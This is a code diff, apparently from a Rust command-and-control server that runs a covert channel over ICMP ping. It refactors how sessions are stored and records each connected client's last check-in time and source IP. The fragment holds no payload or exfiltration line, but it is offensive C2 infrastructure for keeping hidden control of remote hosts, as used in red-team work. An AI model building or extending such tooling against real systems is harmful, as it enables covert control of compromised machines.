@@ -6,13 +6,15 @@ mod patcher;
 mod workers;
 use anyhow::{bail, Result};
 use clap::Parser;
-use covert_c2_ping_common::PingMessage;
+use covert_c2_ping_common::{PingMessage, SessionData};
 use covert_common::CovertChannel;
 use lazy_static::lazy_static;
 use nft::NftRules;
 use rand::Rng;
-use serde::Serialize;
-use std::{collections::HashMap, time::Duration};
+use std::{
+    collections::HashMap,
+    time::{Duration, SystemTime, UNIX_EPOCH},
+};
 use tokio::{
     select,
     signal::{self, unix::SignalKind},
@@ -46,28 +48,10 @@ lazy_static! {
     };
     static ref CHANNEL: Mutex<CovertChannel<PingMessage, 4>> =
         Mutex::new(CovertChannel::<PingMessage, 4>::new(*KEY));
-    static ref SESSIONS: Mutex<HashMap<u16, SessionData>> =
-        Mutex::new(HashMap::<u16, SessionData>::new());
-}
-#[derive(Clone, Serialize)]
-struct SessionData {
-    #[serde(skip_serializing)]
-    notify: UnboundedSender<()>,
-    last_checkin: Option<u64>,
-    host: Option<String>,
-    arch: String,
+    static ref SESSIONS: Mutex<HashMap<u16, (UnboundedSender<()>, SessionData)>> =
+        Mutex::new(HashMap::new());
 }
 
-impl SessionData {
-    fn new(notify: UnboundedSender<()>, arch: &str) -> Self {
-        SessionData {
-            notify,
-            last_checkin: None,
-            host: None,
-            arch: arch.to_owned(),
-        }
-    }
-}
 fn main() -> Result<()> {
     let rt = tokio::runtime::Builder::new_multi_thread()
         .enable_all()
@@ -143,18 +127,25 @@ async fn main_loop(
         let channel_state = CHANNEL.lock().await.put_packet(&incoming_ping.data);
         let out_data: Vec<u8> = match channel_state {
             Ok((inc_chan, has_message)) => {
-                if has_message {
-                    let mut session_guard = SESSIONS.lock().await;
-                    let session = session_guard.get(&inc_chan);
-                    if let Some(session_data) = session {
-                        if let Err(_) = session_data.notify.send(()) {
+                let mut session_guard = SESSIONS.lock().await;
+                let session = session_guard.get_mut(&inc_chan);
+                if let Some((notify, session_data)) = session {
+                    session_data.last_checkin = SystemTime::now()
+                        .duration_since(UNIX_EPOCH)
+                        .ok()
+                        .map(|v| v.as_secs_f64() * 1000.0);
+                    session_data.host = Some(incoming_ping.src_ip);
+                    if has_message {
+                        if let Err(_) = notify.send(()) {
                             tracing::info!(channel = inc_chan, "channel closed");
                             session_guard.remove(&inc_chan);
                         }
-                    } else {
-                        tracing::info!(channel = inc_chan, "not a valid channel");
                     }
+                } else {
+                    tracing::info!(channel = inc_chan, "not a valid channel");
                 }
+                drop(session_guard);
+
                 let (in_num, out_num) = CHANNEL.lock().await.packets_in_queue(inc_chan);
                 tracing::info!(
                     inbound_packets = in_num,
